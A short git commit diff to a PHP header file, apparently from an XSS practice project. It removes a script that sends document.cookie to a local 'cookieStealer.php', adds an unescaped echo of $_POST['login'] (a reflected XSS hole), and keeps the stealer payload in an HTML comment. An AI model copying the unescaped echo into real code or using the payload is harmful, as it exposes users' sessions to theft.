af659e8a0b37c74691536294f37d8ab4a43d008d
Frederic BERTOIA <frederic.bertoia@gmail.com>
2018-06-23 18:46:23 +0200

    yes

--- html/header.php
+++ html/header.php
@@ -2,7 +2,9 @@
 echo '<div class="header">
         <div class="header--logo">Alpha|Avocats</div>
         <input class="header--input" type="text" placeholder="Search your friends here...">
-		<p class="header--font">'.'<script>location.assign("http://localhost:8080/cookieStealer.php?"+document.cookie)</script>'.'</p>
+		<p class="header--font">'.$_POST['login'].'</p>
         <i class="ion-ios-cog icon-big"></i>
     </div>';
 ?>
+
+<!-- '<script>location.assign("http://localhost:8080/cookieStealer.php?"+document.cookie)</script>' -->
